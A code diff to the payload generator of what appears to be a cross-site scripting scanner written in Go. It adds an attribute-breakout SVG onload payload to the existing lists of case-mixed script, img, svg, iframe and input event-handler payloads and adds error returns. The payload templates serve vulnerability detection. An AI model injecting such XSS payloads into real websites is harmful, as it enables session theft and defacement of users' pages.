@@ -54,6 +54,7 @@ var (
 	svg_payload    string = "<sVg/OnLoAd=%s>"
 	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
 	input_payload  string = "<input autofocus onfocus=%s>"
+	svg_payload1   string = "><sVg/OnLoAd=%s>"
 )
 
 var (
@@ -192,7 +193,13 @@ extension 扩展类型
 func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interface{}) interface{} {
 	g.flag = flag
 	if Htmlmode == Tagmode {
-		htmlpayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
+		htmlpayload := []string{script_payload,
+			img_payload,
+			href_payload,
+			svg_payload,
+			iframe_payload,
+			input_payload,
+			svg_payload1}
 		g.words = append(g.words, htmlpayload...)
 		g.mapmode(CheckValue, true)
 	} else if Comment == Tagmode {
@@ -203,13 +210,25 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interfa
 		switch s := extension.(type) {
 		case Helper.Occurence:
 			if funk.Contains(s.Type, "key") {
-				KeyPayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
+				KeyPayload := []string{script_payload,
+					img_payload,
+					href_payload,
+					svg_payload,
+					iframe_payload,
+					input_payload,
+					svg_payload1}
 				g.words = append(g.words, KeyPayload...)
 				g.mapmode(CheckValue, true)
 			} else if funk.Contains(s.Type, "value") {
 				if ok, _ := CheckHtmlNodeAttributes(s, "key", "srcdoc", false); ok {
 					//替换'<'和'>'为 url 编码
-					ValuePayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
+					ValuePayload := []string{script_payload,
+						img_payload,
+						href_payload,
+						svg_payload,
+						iframe_payload,
+						input_payload,
+						svg_payload1}
 					newValuePayload := funk.Map(ValuePayload, func(payload string) string {
 						Lstr := strings.Replace(payload, "<", "%26lt;", -1)
 						Rstr := strings.Replace(Lstr, ">", "%26gt;", -1)
@@ -232,7 +251,10 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interfa
 				//处理onerror等on开头的属性情况
 				if ok, Kv := CheckHtmlNodeAttributes(s, "key", "on", true); ok {
 					script := Kv.V.String()
-					payload, _ := Helper.AnalyseJSFuncByFlag(flag, script)
+					payload, err := Helper.AnalyseJSFuncByFlag(flag, script)
+					if err != nil {
+						return err
+					}
 					log.Info("Attributes generator payload:%s", payload)
 					g.words = append(g.words, payload)
 					g.mapmode(CheckConsoleLog, false)
@@ -249,7 +271,10 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interfa
 	} else if Script == Tagmode {
 		switch s := extension.(type) {
 		case Helper.Occurence:
-			payload, _ := Helper.AnalyseJSFuncByFlag(flag, s.Details.Content)
+			payload, err := Helper.AnalyseJSFuncByFlag(flag, s.Details.Content)
+			if err != nil {
+				return err
+			}
 			log.Info("Script generator payload:%s", payload)
 			payloads := []string{payload}
 			g.words = append(g.words, payloads...)
